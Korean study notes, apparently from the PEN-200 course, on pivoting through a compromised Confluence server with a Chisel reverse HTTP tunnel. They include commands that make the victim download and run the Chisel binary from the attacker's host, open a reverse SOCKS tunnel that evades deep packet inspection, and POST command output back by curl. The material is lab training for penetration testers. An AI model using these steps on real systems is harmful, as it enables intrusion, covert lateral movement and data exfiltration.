# 20.1.2 Chisel HTTP 터널링

> **HTTP Tunneling with Chisel** · PEN-200 §20.1.2

Chisel 은 데이터 스트림을 HTTP 안에 감싸는 터널링 도구임. 터널 내부는 SSH 프로토콜을 쓰므로 내용이 암호화됨. 클라이언트/서버 모델이고, 서버를 먼저 띄우면 클라이언트가 붙음. 조합에 따라 여러 포워딩 방식이 되는데 여기서 쓸 것은 SSH 원격 포트 포워딩에 대응하는 **역방향 포트 포워딩**임. macOS·Linux·Windows 및 각 아키텍처용 빌드가 있음 — HTTPTunnel 같은 구식 도구도 비슷한 일을 하지만 유연성과 크로스 플랫폼 지원이 떨어짐.

계획:

- **Kali 에 Chisel 서버**, 침해한 CONFLUENCE01 에 **Chisel 클라이언트**
- 클라이언트가 붙으면 Kali 쪽에 SOCKS 프록시 포트가 열림
- 그 SOCKS 포트로 넣은 것을 서버가 캡슐화해 HTTP 터널로 밀고, 클라이언트가 풀어 목적지로 보냄

⚠️ **방향을 뒤집지 말 것** — 서버가 공격자(Kali), 클라이언트가 피벗 호스트임. 그런데 «연결» 은 클라이언트에서 서버로 나가는 아웃바운드 HTTP라, DPI 에는 CONFLUENCE01 이 웹 요청을 하는 것으로 보임.

*Chisel 구성이 끝났을 때 의도한 네트워크 모습*

클라이언트↔서버 구간이 전부 HTTP 형식이라, 각 HTTP 패킷의 «내용» 이 무엇이든 심층 패킷 검사를 통과함. Kali 의 서버는 TCP/8080 을 대기하고, 거기로 붙은 클라이언트가 SOCKS 프록시 포트 TCP/1080 을 Kali 에 열게 됨.

먼저 클라이언트 바이너리를 CONFLUENCE01 에 올려야 함. **서버와 클라이언트는 같은 바이너리**이고 첫 인자를 `server` 로 주느냐 `client` 로 주느냐로만 갈림. 대상의 OS·아키텍처가 다르면 Chisel GitHub 릴리스에서 그 조합의 빌드를 받아야 하지만, 여기서는 양쪽 다 amd64 Linux 라 Kali 의 바이너리를 그대로 시도함.

전달은 인젝션으로 Kali 의 Apache 에서 내려받는 방식임. 먼저 Chisel 바이너리를 Apache 웹루트에 복사함.

```
kali@kali:~$ sudo cp $(which chisel) /var/www/html/
kali@kali:~$
```

*Chisel 바이너리를 Apache2 웹루트로 복사*

Apache2 를 기동함.

```
kali@kali:~$ sudo systemctl start apache2
[sudo] password for kali:
kali@kali:~$
```

*Apache2 시작*

그 뒤 아래 명령을 인젝션으로 실행함.

```
wget 192.168.118.4/chisel -O /tmp/chisel && chmod +x /tmp/chisel
```

*Apache2 서버에 들어온 Chisel 바이너리 요청*

Kali 쪽 서버는 `server` 하위 명령 + 바인드 포트(`--port`) + 역방향 포워딩 허용(`--reverse`) 으로 띄움.

```
kali@kali:~$ chisel server --port 8080 --reverse
2023/10/03 15:57:53 server: Reverse tunnelling enabled
2023/10/03 15:57:53 server: Fingerprint Pru+AFGOUxnEXyK1Z14RMqeiTaCdmX6j4zsa9S2Lx7c=
2023/10/03 15:57:53 server: Listening on http://0.0.0.0:8080
```

*Chisel 서버 기동 — 역방향 터널 활성화 확인*

클라이언트를 붙이기 전에 tcpdump 로 유입을 걸어 둠. 서버 로그만 보면 실패했을 때 원인을 못 좁힘.

```
kali@kali:~$ sudo tcpdump -nvvvXi tun0 tcp port 8080
tcpdump: listening on tun0, link-type EN10MB (Ethernet), snapshot length 262144 bytes
```

*tun0 의 TCP/8080 유입 캡처*

클라이언트는 서버 주소와 포워딩 설정을 인자로 받음. `R:socks` 의 `R` 접두어가 **역방향** 터널을, `socks` 가 SOCKS 프록시(기본 1080 바인딩)를 뜻함. 뒤의 리다이렉션은 프로세스를 배경으로 돌려 인젝션이 종료 대기로 멎지 않게 하는 장치임.

```
/tmp/chisel client 192.168.118.4:8080 R:socks > /dev/null 2>&1 &
```

*웹셸에서 실행할 Chisel 클라이언트 명령*

이것을 Confluence 인젝션 페이로드로 변환해 CONFLUENCE01 에 보냄.

*인젝션 페이로드로 Chisel 클라이언트 기동 시도*

그런데 **아무 일도 일어나지 않음** — tcpdump 에도 서버 로그에도 아무 것도 안 잡힘. 클라이언트 실행이 실패했다는 뜻인데, 인젝션으로 돌린 프로세스라 에러 출력을 볼 수 없음.

⭐ **여기서 쓰는 기법이 이 절의 핵심임 — 출력을 파일로 모아 HTTP 로 회수함.** `&>` 로 stdout·stderr 를 통째로 `/tmp/output` 에 담고, `curl --data @/tmp/output` 으로 Kali 에 POST 함. 대기 중인 tcpdump 가 그 POST 본문을 그대로 보여 줌.

```
/tmp/chisel client 192.168.118.4:8080 R:socks &> /tmp/output; curl --data @/tmp/output
http://192.168.118.4:8080/
```

이제 이 프록시로 PGDATABASE01 의 SSH 에 붙음. 앞 모듈에서는 Proxychains 로 SOCKS 를 모르는 도구를 터널에 태웠지만, 여기서는 SSH 자체를 SOCKS 로 태우는 것이라 방법이 다름.

**SSH 에는 범용 SOCKS 옵션이 없고 `ProxyCommand` 설정을 씀.** 설정 파일에 적거나 `-o` 로 넘김. `ProxyCommand` 는 프록시가 적용된 채널을 여는 셸 명령을 받음. 문서는 OpenBSD 판 Netcat 의 `-X` 를 권하지만 **Kali 기본 Netcat 은 프록시를 지원하지 않음** — Nmap 관리자들이 만든 Ncat 을 `sudo apt install ncat` 으로 설치해 씀.
